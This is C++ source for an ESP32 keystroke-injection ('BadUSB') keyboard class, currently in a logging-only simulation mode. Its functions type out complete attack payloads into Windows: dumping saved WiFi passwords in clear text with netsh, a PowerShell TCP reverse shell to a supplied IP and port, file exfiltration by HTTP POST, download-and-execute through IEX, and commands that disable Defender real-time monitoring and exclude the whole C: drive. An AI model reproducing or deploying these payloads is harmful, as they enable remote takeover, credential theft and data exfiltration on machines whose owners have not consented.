#include "USBKeyboard.h"
#include <esp_log.h>

static const char* TAG = "USBKeyboard";

// For now, we'll use serial output to simulate keyboard actions
// This will help test the logic before implementing actual USB HID

USBKeyboard::USBKeyboard() : initialized(false), typing_delay(50) {
}

bool USBKeyboard::begin() {
    if (initialized) return true;
    
    ESP_LOGI(TAG, "Initializing USB Keyboard (simulation mode)");
    
    // TODO: Initialize actual USB HID when library is available
    // For now, we'll output to serial for testing
    
    initialized = true;
    ESP_LOGI(TAG, "USB Keyboard initialized in simulation mode");
    return true;
}

void USBKeyboard::end() {
    if (!initialized) return;
    initialized = false;
}

bool USBKeyboard::isInitialized() {
    return initialized;
}

void USBKeyboard::pressKey(uint8_t key) {
    if (!initialized) return;
    ESP_LOGD(TAG, "Press key: 0x%02X", key);
}

void USBKeyboard::releaseKey(uint8_t key) {
    if (!initialized) return;
    ESP_LOGD(TAG, "Release key: 0x%02X", key);
}

void USBKeyboard::releaseAll() {
    if (!initialized) return;
    ESP_LOGD(TAG, "Release all keys");
}

void USBKeyboard::tapKey(uint8_t key) {
    if (!initialized) return;
    pressKey(key);
    delay(10);
    releaseKey(key);
    delay(10);
}

void USBKeyboard::typeString(const char* str) {
    if (!initialized || !str) return;
    
    ESP_LOGI(TAG, "Typing: %s", str);
    
    while (*str) {
        char c = *str++;
        
        // Simulate typing for now
        if (c >= 'a' && c <= 'z') {
            tapKey(KEY_A + (c - 'a'));
        } else if (c >= 'A' && c <= 'Z') {
            pressKey(KEY_LEFT_SHIFT);
            tapKey(KEY_A + (c - 'A'));
            releaseKey(KEY_LEFT_SHIFT);
        } else if (c >= '0' && c <= '9') {
            tapKey(KEY_0 + (c - '0'));
        } else {
            switch (c) {
                case ' ': tapKey(KEY_SPACE); break;
                case '\n': tapKey(KEY_ENTER); break;
                case '\t': tapKey(KEY_TAB); break;
                case '.': tapKey(KEY_PERIOD); break;
                case ',': tapKey(KEY_COMMA); break;
                case '-': tapKey(KEY_MINUS); break;
                case '=': tapKey(KEY_EQUAL); break;
                case '/': tapKey(KEY_SLASH); break;
                case '\\': tapKey(KEY_BACKSLASH); break;
                case ';': tapKey(KEY_SEMICOLON); break;
                case '\'': tapKey(KEY_QUOTE); break;
                case '[': tapKey(KEY_LEFT_BRACKET); break;
                case ']': tapKey(KEY_RIGHT_BRACKET); break;
            }
        }
        
        delay(typing_delay);
    }
}

void USBKeyboard::executeCommand(const char* cmd, bool pressEnter) {
    if (!initialized || !cmd) return;
    
    ESP_LOGI(TAG, "Execute command: %s", cmd);
    typeString(cmd);
    
    if (pressEnter) {
        delay(50);
        tapKey(KEY_ENTER);
    }
}

void USBKeyboard::openRun() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "Opening Windows Run dialog");
    pressKey(KEY_LEFT_GUI);
    tapKey(KEY_R);
    releaseKey(KEY_LEFT_GUI);
    delay(500);
}

void USBKeyboard::openTerminal() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "Opening terminal");
    openRun();
    executeCommand("cmd");
    delay(1000);
}

void USBKeyboard::openPowerShell() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "Opening PowerShell");
    openRun();
    executeCommand("powershell");
    delay(1000);
}

void USBKeyboard::runNetworkScan() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "Running network scan payload");
    openPowerShell();
    delay(500);
    
    // Network information commands
    executeCommand("Get-NetAdapter | Select-Object Name, Status, MacAddress | Format-Table -AutoSize");
    delay(1000);
    executeCommand("Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4'} | Format-Table -AutoSize");
    delay(1000);
    executeCommand("arp -a");
    delay(1000);
    executeCommand("netstat -an | findstr LISTENING");
}

void USBKeyboard::harvestSystemInfo() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "Harvesting system information");
    openPowerShell();
    delay(500);
    
    executeCommand("Get-ComputerInfo | Select-Object CsName, WindowsVersion, OsArchitecture | Format-List");
    delay(1000);
    executeCommand("whoami /all");
    delay(1000);
    executeCommand("Get-Process | Sort-Object CPU -Descending | Select-Object -First 10");
}

void USBKeyboard::harvestWifiPasswords() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "Harvesting WiFi passwords");
    openTerminal();
    delay(500);
    
    executeCommand("netsh wlan show profiles");
    delay(1000);
    executeCommand("for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| findstr /c:\"All User Profile\"') do (for /f \"tokens=*\" %b in (\"%a\") do netsh wlan show profile name=\"%b\" key=clear | findstr /c:\"SSID name\" /c:\"Key Content\")");
}

void USBKeyboard::createReverseShell(const char* ip, uint16_t port) {
    if (!initialized || !ip) return;
    
    ESP_LOGI(TAG, "Creating reverse shell to %s:%d", ip, port);
    openPowerShell();
    delay(500);
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd), 
        "$c=New-Object System.Net.Sockets.TCPClient('%s',%d);$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
        "{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
        "$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);"
        "$s.Flush()};$c.Close()",
        ip, port);
    
    executeCommand(cmd);
}

void USBKeyboard::exfiltrateFile(const char* filepath, const char* destUrl) {
    if (!initialized || !filepath || !destUrl) return;
    
    ESP_LOGI(TAG, "Exfiltrating %s to %s", filepath, destUrl);
    openPowerShell();
    delay(500);
    
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "Invoke-WebRequest -Uri '%s' -Method POST -InFile '%s'", destUrl, filepath);
    executeCommand(cmd);
}

void USBKeyboard::downloadAndExecute(const char* url) {
    if (!initialized || !url) return;
    
    ESP_LOGI(TAG, "Download and execute from %s", url);
    openPowerShell();
    delay(500);
    
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "(New-Object System.Net.WebClient).DownloadString('%s') | IEX", url);
    executeCommand(cmd);
}

void USBKeyboard::disableDefender() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "Attempting to disable Windows Defender");
    openPowerShell();
    delay(500);
    
    executeCommand("Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue");
    delay(500);
    executeCommand("Add-MpPreference -ExclusionPath 'C:\\' -ErrorAction SilentlyContinue");
}

void USBKeyboard::lockWorkstation() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "Locking workstation");
    pressKey(KEY_LEFT_GUI);
    tapKey(KEY_L);
    releaseKey(KEY_LEFT_GUI);
}

void USBKeyboard::minimizeAllWindows() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "Minimizing all windows");
    pressKey(KEY_LEFT_GUI);
    tapKey(KEY_D);
    releaseKey(KEY_LEFT_GUI);
}

void USBKeyboard::takeScreenshot() {
    if (!initialized) return;
    
    ESP_LOGI(TAG, "Taking screenshot");
    pressKey(KEY_LEFT_GUI);
    pressKey(KEY_LEFT_SHIFT);
    tapKey(KEY_S);
    releaseKey(KEY_LEFT_SHIFT);
    releaseKey(KEY_LEFT_GUI);
}

void USBKeyboard::setTypingDelay(uint32_t delay_ms) {
    typing_delay = delay_ms;
}